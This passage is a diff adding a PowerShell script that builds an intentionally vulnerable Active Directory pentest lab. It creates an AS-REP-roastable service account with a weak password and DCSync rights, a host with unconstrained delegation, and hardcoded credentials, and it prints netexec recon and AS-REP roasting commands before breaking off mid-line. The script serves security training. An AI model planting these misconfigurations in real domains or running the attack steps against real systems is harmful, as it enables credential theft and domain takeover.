@@ -1,0 +1,402 @@
+#Requires -RunAsAdministrator
+param(
+    [string]$DomainName = "pentest.local",
+    [string]$DomainNetBIOS = "PENTEST",
+    [string]$SafeModePassword = "P@ssw0rd!SafeMode2024",
+    [string]$AdminPassword = "Str0ng!Adm1n#2024Secure"
+)
+
+$ErrorActionPreference = "Continue"
+$ProgressPreference = "SilentlyContinue"
+
+function Write-Step {
+    param([string]$msg, [string]$color = "Cyan")
+    Write-Host ""
+    Write-Host "========================================" -ForegroundColor DarkGray
+    Write-Host "  $msg" -ForegroundColor $color
+    Write-Host "========================================" -ForegroundColor DarkGray
+}
+
+function Write-OK { param([string]$msg); Write-Host "  [OK] $msg" -ForegroundColor Green }
+function Write-Warn2 { param([string]$msg); Write-Host "  [!!] $msg" -ForegroundColor Yellow }
+function Write-Fail { param([string]$msg); Write-Host "  [FAIL] $msg" -ForegroundColor Red }
+function Write-Info { param([string]$msg); Write-Host "  [..] $msg" -ForegroundColor Gray }
+
+Write-Host ""
+Write-Host "####################################################" -ForegroundColor Magenta
+Write-Host "#   AD PENTEST LAB - MEDIUM v2                     #" -ForegroundColor Magenta
+Write-Host "#   Realistic attack chain, no weak passwords      #" -ForegroundColor Magenta
+Write-Host "####################################################" -ForegroundColor Magenta
+
+# ============================================
+# STEP 1: Install AD DS
+# ============================================
+Write-Step "STEP 1/6 : Install Active Directory Domain Services"
+
+try {
+    $adFeature = Get-WindowsFeature AD-Domain-Services -ErrorAction Stop
+    if ($adFeature.Installed) {
+        Write-OK "AD-Domain-Services already installed"
+    } else {
+        Write-Info "Installing AD-Domain-Services role..."
+        $result = Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
+        if ($result.Success) {
+            Write-OK "AD-Domain-Services installed successfully"
+        } else {
+            Write-Fail "Failed to install AD-Domain-Services"; exit 1
+        }
+    }
+} catch {
+    Write-Fail "Error checking/installing AD feature: $_"
+    exit 1
+}
+
+# Check if forest exists
+try {
+    $domain = Get-ADDomain -ErrorAction Stop
+    Write-OK "Forest already exists: $($domain.DNSRoot)"
+} catch {
+    Write-Info "No forest found. Creating new forest: $DomainName ..."
+    try {
+        $securePass = ConvertTo-SecureString $SafeModePassword -AsPlainText -Force
+        Install-ADDSForest `
+            -DomainName $DomainName `
+            -DomainNetbiosName $DomainNetBIOS `
+            -SafeModeAdministratorPassword $securePass `
+            -InstallDns:$true `
+            -NoRebootOnCompletion:$false `
+            -Force `
+            -ErrorAction Stop | Out-Null
+        
+        Write-Warn2 "Server is rebooting now..."
+        Write-Warn2 "After reboot, run this script AGAIN to continue setup."
+        Write-Host ""
+        Read-Host "Press Enter to exit"
+        exit 0
+    } catch {
+        Write-Fail "Failed to create forest: $_"
+        exit 1
+    }
+}
+
+# Wait for AD to be ready
+Write-Info "Waiting for AD to be ready..."
+$retries = 0
+$maxRetries = 60
+while ($retries -lt $maxRetries) {
+    try {
+        $null = Get-ADDomain -ErrorAction Stop
+        Write-OK "AD is ready (waited $($retries * 3) seconds)"
+        break
+    } catch {
+        Start-Sleep -Seconds 3
+        $retries++
+        Write-Host "." -NoNewline -ForegroundColor DarkGray
+    }
+}
+if ($retries -ge $maxRetries) {
+    Write-Fail "AD did not become ready after 180 seconds"
+    exit 1
+}
+Write-Host ""
+
+# ============================================
+# STEP 2: Apply Security Baseline
+# ============================================
+Write-Step "STEP 2/6 : Apply Security Baseline"
+
+try {
+    # SMB Signing
+    Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters" -Name "RequireSecuritySignature" -Value 1 -ErrorAction Stop
+    Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters" -Name "EnableSecuritySignature" -Value 1 -ErrorAction Stop
+    Write-OK "SMB Signing = Required"
+} catch {
+    Write-Fail "SMB Signing config failed: $_"
+}
+
+try {
+    # NTLMv2 only
+    Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -Value 4 -ErrorAction Stop
+    Write-OK "NTLMv2 only (LmCompatibilityLevel=4)"
+} catch {
+    Write-Fail "NTLM config failed: $_"
+}
+
+try {
+    # Restrict Anonymous
+    Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RestrictAnonymous" -Value 1 -ErrorAction Stop
+    Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RestrictAnonymousSAM" -Value 1 -ErrorAction Stop
+    Write-OK "RestrictAnonymous = 1"
+} catch {
+    Write-Fail "RestrictAnonymous config failed: $_"
+}
+
+try {
+    # WDigest off
+    Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 0 -ErrorAction Stop
+    Write-OK "WDigest = Disabled"
+} catch {
+    Write-Fail "WDigest config failed: $_"
+}
+
+try {
+    # Password policy
+    Set-ADDefaultDomainPasswordPolicy -Identity $DomainName `
+        -MinPasswordLength 12 `
+        -ComplexityEnabled $true `
+        -LockoutThreshold 5 `
+        -LockoutDuration (New-TimeSpan -Minutes 30) `
+        -ErrorAction Stop
+    Write-OK "Password policy: 12+ chars, complexity, lockout=5"
+} catch {
+    Write-Fail "Password policy failed: $_"
+}
+
+# ============================================
+# STEP 3: Create OU Structure and Users
+# ============================================
+Write-Step "STEP 3/6 : Create OU Structure and Users"
+
+$dn = ""
+try {
+    $dn = (Get-ADDomain -ErrorAction Stop).DistinguishedName
+    Write-OK "Domain DN: $dn"
+} catch {
+    Write-Fail "Cannot get domain DN: $_"
+    exit 1
+}
+
+# Create OUs
+$ouList = @("Servers", "Workstations", "ServiceAccounts", "IT-Staff")
+foreach ($ouName in $ouList) {
+    try {
+        $existing = Get-ADOrganizationalUnit -Filter "Name -eq '$ouName'" -ErrorAction SilentlyContinue
+        if (-not $existing) {
+            New-ADOrganizationalUnit -Name $ouName -ProtectedFromAccidentalDeletion $false -ErrorAction Stop | Out-Null
+            Write-OK "OU created: $ouName"
+        } else {
+            Write-Info "OU already exists: $ouName"
+        }
+    } catch {
+        Write-Fail "Failed to create OU $ouName : $_"
+    }
+}
+
+# Create regular users with strong passwords
+$regularUsers = @(
+    @{ Name = "alice.johnson"; Password = "X9mK2pL7nQ4wZrT6"; Desc = "HR Manager" },
+    @{ Name = "carol.white";   Password = "W2qF9dM5kS7xYbN3"; Desc = "Accountant" }
+)
+
+foreach ($user in $regularUsers) {
+    try {
+        $existing = Get-ADUser -Filter "SamAccountName -eq '$($user.Name)'" -ErrorAction SilentlyContinue
+        if (-not $existing) {
+            $secPass = ConvertTo-SecureString $user.Password -AsPlainText -Force
+            New-ADUser `
+                -Name $user.Name `
+                -SamAccountName $user.Name `
+                -AccountPassword $secPass `
+                -Enabled $true `
+                -Description $user.Desc `
+                -Path "OU=Workstations,$dn" `
+                -ErrorAction Stop | Out-Null
+            Write-OK "User created: $($user.Name) (strong password, not crackable)"
+        } else {
+            Write-Info "User already exists: $($user.Name)"
+        }
+    } catch {
+        Write-Fail "Failed to create user $($user.Name) : $_"
+    }
+}
+
+# ============================================
+# STEP 4: VULNERABILITY - AS-REP + DCSync
+# ============================================
+Write-Step "STEP 4/6 : Setup Attack Vector (AS-REP + DCSync)" -color Red
+
+$targetUser = "svc_backupagent"
+$targetPass = "Welcome2024!"
+
+# Create target user
+try {
+    $existing = Get-ADUser -Filter "SamAccountName -eq '$targetUser'" -ErrorAction SilentlyContinue
+    if (-not $existing) {
+        $secPass = ConvertTo-SecureString $targetPass -AsPlainText -Force
+        New-ADUser `
+            -Name $targetUser `
+            -SamAccountName $targetUser `
+            -AccountPassword $secPass `
+            -Enabled $true `
+            -Description "Backup Agent Service - TEMP PASSWORD" `
+            -Path "OU=ServiceAccounts,$dn" `
+            -ErrorAction Stop | Out-Null
+        Write-OK "Target user created: $targetUser"
+    } else {
+        Write-Info "Target user already exists: $targetUser"
+    }
+} catch {
+    Write-Fail "Failed to create target user: $_"
+}
+
+# Disable Kerberos pre-authentication (AS-REP vulnerability)
+try {
+    Set-ADAccountControl -Identity $targetUser -DoesNotRequirePreAuth $true -ErrorAction Stop
+    Write-OK "VULNERABILITY SET: DoesNotRequirePreAuth = TRUE on $targetUser"
+    Write-Warn2 "  -> AS-REP Roasting will work WITHOUT any credentials"
+} catch {
+    Write-Fail "Failed to set DoesNotRequirePreAuth: $_"
+}
+
+# Create DCSync group
+$dcSyncGroup = "AD-Backup-Operators"
+try {
+    $existing = Get-ADGroup -Filter "Name -eq '$dcSyncGroup'" -ErrorAction SilentlyContinue
+    if (-not $existing) {
+        New-ADGroup `
+            -Name $dcSyncGroup `
+            -GroupScope Global `
+            -Path "OU=IT-Staff,$dn" `
+            -Description "Backup operators with replication rights" `
+            -ErrorAction Stop | Out-Null
+        Write-OK "Group created: $dcSyncGroup"
+    } else {
+        Write-Info "Group already exists: $dcSyncGroup"
+    }
+} catch {
+    Write-Fail "Failed to create group: $_"
+}
+
+# Grant DCSync rights to the group
+try {
+    $acl = Get-Acl "AD:$dn" -ErrorAction Stop
+    $gSid = (Get-ADGroup $dcSyncGroup -ErrorAction Stop).SID
+    
+    # DS-Replication-Get-Changes
+    $guid1 = [System.Guid]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
+    $ace1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($gSid, "ExtendedRight", "Allow", $guid1)
+    
+    # DS-Replication-Get-Changes-All
+    $guid2 = [System.Guid]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
+    $ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($gSid, "ExtendedRight", "Allow", $guid2)
+    
+    $acl.AddAccessRule($ace1)
+    $acl.AddAccessRule($ace2)
+    Set-Acl -AclObject $acl "AD:$dn" -ErrorAction Stop
+    
+    Write-OK "DCSync rights granted to group: $dcSyncGroup"
+    Write-Warn2 "  -> Members can run secretsdump (DCSync attack)"
+} catch {
+    Write-Fail "Failed to grant DCSync rights: $_"
+}
+
+# Add target user to DCSync group
+try {
+    $member = Get-ADGroupMember -Identity $dcSyncGroup -ErrorAction SilentlyContinue | Where-Object { $_.SamAccountName -eq $targetUser }
+    if (-not $member) {
+        Add-ADGroupMember -Identity $dcSyncGroup -Members $targetUser -ErrorAction Stop
+        Write-OK "$targetUser added to $dcSyncGroup (has DCSync rights)"
+    } else {
+        Write-Info "$targetUser already in $dcSyncGroup"
+    }
+} catch {
+    Write-Fail "Failed to add user to group: $_"
+}
+
+# ============================================
+# STEP 5: Unconstrained Delegation (bonus)
+# ============================================
+Write-Step "STEP 5/6 : Setup Bonus Vector (Unconstrained Delegation)" -color Yellow
+
+$fileServer = "FILE-SRV01"
+try {
+    $existing = Get-ADComputer -Filter "Name -eq '$fileServer'" -ErrorAction SilentlyContinue
+    if (-not $existing) {
+        New-ADComputer `
+            -Name $fileServer `
+            -Path "OU=Servers,$dn" `
+            -TrustedForDelegation $true `
+            -ErrorAction Stop | Out-Null
+        Write-OK "Computer created: $fileServer with Unconstrained Delegation"
+        Write-Warn2 "  -> Printer Bug / SpoolSample attack vector available"
+    } else {
+        Write-Info "Computer already exists: $fileServer"
+    }
+} catch {
+    Write-Fail "Failed to create computer object: $_"
+}
+
+# ============================================
+# STEP 6: Enable RDP and WinRM
+# ============================================
+Write-Step "STEP 6/6 : Enable RDP and WinRM"
+
+try {
+    Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -ErrorAction Stop
+    Write-OK "RDP enabled in registry"
+} catch {
+    Write-Fail "RDP registry failed: $_"
+}
+
+try {
+    Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction Stop | Out-Null
+    Write-OK "RDP firewall rule enabled"
+} catch {
+    Write-Warn2 "RDP firewall rule: $_"
+}
+
+try {
+    winrm quickconfig -force -quiet 2>$null | Out-Null
+    Write-OK "WinRM configured"
+} catch {
+    Write-Warn2 "WinRM config: $_"
+}
+
+try {
+    Enable-PSRemoting -Force -SkipNetworkProfileCheck -ErrorAction Stop | Out-Null
+    Write-OK "PSRemoting enabled"
+} catch {
+    Write-Warn2 "PSRemoting: $_"
+}
+
+try {
+    Set-NetFirewallRule -Name "WINRM-HTTP-In-TCP" -Action Allow -ErrorAction Stop | Out-Null
+    Write-OK "WinRM firewall rule enabled"
+} catch {
+    Write-Warn2 "WinRM firewall: $_"
+}
+
+# ============================================
+# SUMMARY
+# ============================================
+$dcIP = "UNKNOWN"
+try {
+    $dcIP = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction Stop | 
+             Where-Object { $_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -ne "127.0.0.1" } | 
+             Select-Object -First 1).IPAddress
+} catch {
+    Write-Warn2 "Could not detect DC IP automatically"
+}
+
+Write-Host ""
+Write-Host "####################################################" -ForegroundColor Green
+Write-Host "#              LAB SETUP COMPLETE                  #" -ForegroundColor Green
+Write-Host "####################################################" -ForegroundColor Green
+Write-Host ""
+Write-Host "  Domain    : $DomainName" -ForegroundColor White
+Write-Host "  DC IP     : $dcIP" -ForegroundColor White
+Write-Host "  Admin     : Administrator / $AdminPassword" -ForegroundColor White
+Write-Host ""
+Write-Host "----------------------------------------------------" -ForegroundColor DarkGray
+Write-Host "  ATTACK CHAIN (from Kali Linux):" -ForegroundColor Cyan
+Write-Host "----------------------------------------------------" -ForegroundColor DarkGray
+Write-Host ""
+Write-Host "  DC=$dcIP" -ForegroundColor Yellow
+Write-Host ""
+Write-Host "  # Step 1: Recon" -ForegroundColor Gray
+Write-Host "  netexec smb `$DC/24" -ForegroundColor White
+Write-Host ""
+Write-Host "  # Step 2: AS-REP Roasting (NO credentials needed!)" -ForegroundColor Gray
+Write-Host "  netexec ldap `$DC -u '' -p '' --asreproast asrep.txt" -ForegroundColor White
+Write-Host ""
+Write-Host "  # Step
